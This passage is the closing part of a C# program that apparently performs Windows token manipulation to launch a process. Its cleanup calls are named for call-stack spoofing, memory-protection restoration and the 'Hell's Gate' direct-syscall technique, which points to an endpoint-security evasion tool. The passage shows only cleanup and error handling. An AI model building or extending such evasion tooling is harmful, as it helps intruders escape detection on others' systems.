                            CloseHandle(pi.hThread);
                        }
                        else
                        {
                            Console.WriteLine($"[-] Second attempt failed: {Marshal.GetLastWin32Error()}");
                        }
                    }
                    else if (error == 740)
                    {
                        Console.WriteLine("[!] ERROR: ELEVATION REQUIRED - Run as Administrator!");
                    }
                }

                if (_ntClose != null) _ntClose(hPrimaryToken);
                else CloseHandle(hPrimaryToken);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }

            // Cleanup
            SpoofingEngine.RestoreStack();
            TextProtection.RestoreProtections();
            HellsGate.Cleanup();

            Console.WriteLine();
            Console.WriteLine("[*] Press any key to exit...");
            Console.ReadKey();
        }

        #endregion
    }
}